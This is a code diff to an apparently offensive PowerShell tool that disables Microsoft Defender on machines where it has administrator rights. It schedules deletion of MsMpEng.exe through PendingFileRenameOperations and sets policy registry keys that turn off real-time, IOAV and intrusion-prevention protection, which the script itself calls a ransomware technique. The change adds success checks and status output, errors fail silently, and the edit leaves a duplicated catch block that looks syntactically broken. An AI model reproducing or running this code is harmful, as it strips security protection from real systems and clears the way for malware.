@@ -5,6 +5,8 @@ function IsAdmin {
 
 if (IsAdmin) {
     $defenderKilled = $false  # Track if any method succeeded
+    $pendingFileRenameSuccess = $false  # Track PendingFileRenameOperations success
+    $registryEditSuccess = $false       # Track registry edit success
 
     # PendingFileRenameOperations technique
     try {
@@ -14,7 +16,9 @@ if (IsAdmin) {
         $newOperation = "\??\$DefenderBinaryPath`0`0"
         Set-ItemProperty -Path "HKLM:\SYSTEM\CurrentControlSet\Control\Session Manager" `
         -Name "PendingFileRenameOperations" -Value @($currentOperations + $newOperation) -Force
-        $defenderKilled = $true
+        # Verify the change
+        $pendingFileRenameSuccess = (Get-ItemProperty -Path "HKLM:\SYSTEM\CurrentControlSet\Control\Session Manager" `
+        -Name "PendingFileRenameOperations" -ErrorAction SilentlyContinue).PendingFileRenameOperations -like "*MsMpEng.exe*"
     } catch {
         # Silent failure
     }
@@ -33,7 +37,13 @@ if (IsAdmin) {
         cmd.exe /C reg add "HKLM\Software\Policies\Microsoft\Windows Defender\Real-Time Protection" /v "DisableIntrusionPreventionSystem" /t REG_DWORD /d "1" /f >$null 2>&1
         cmd.exe /C reg add "HKLM\Software\Policies\Microsoft\Windows Defender\Real-Time Protection" /v "DisableIOAVProtection" /t REG_DWORD /d "1" /f >$null 2>&1
         cmd.exe /C reg add "HKLM\Software\Policies\Microsoft\Windows Defender" /v "ServiceKeepAlive" /t REG_DWORD /d "0" /f >$null 2>&1
-        $defenderKilled = $true
+        
+        # Verify the change
+        $realTimeProtectionStatus = (Get-ItemProperty -Path "HKLM:\Software\Policies\Microsoft\Windows Defender\Real-Time Protection").DisableRealtimeMonitoring
+        $registryEditSuccess = ($realTimeProtectionStatus -eq 1)
+    } catch {
+        # Silent failure
+    }
     } catch {
         # Silent failure
     }
@@ -54,8 +64,12 @@ if (IsAdmin) {
         foreach ($line in $lines) {
             Write-Host $line -ForegroundColor DarkRed
         }
-        Write-Host "Defender Kill    :                                            [KO] Clop Ransomware Technique" -ForegroundColor DarkGray
-        Write-Host "Defender Kill    :                                            [KO] PendingFileRenameOperations Junction" -ForegroundColor DarkGray
+        if ($pendingFileRenameSuccess) {
+            Write-Host "Defender Kill    :                                            [KO] PendingFileRenameOperations Junction" -ForegroundColor DarkGray
+        }
+        if ($registryEditSuccess) {
+            Write-Host "Defender Kill    :                                            [KO] Clop Ransomware Technique" -ForegroundColor DarkGray
+        }
     } else {
         # Failure message
         Write-Host "Defender Kill    :                                            [??] Unable to kill Defender" -ForegroundColor DarkYellow
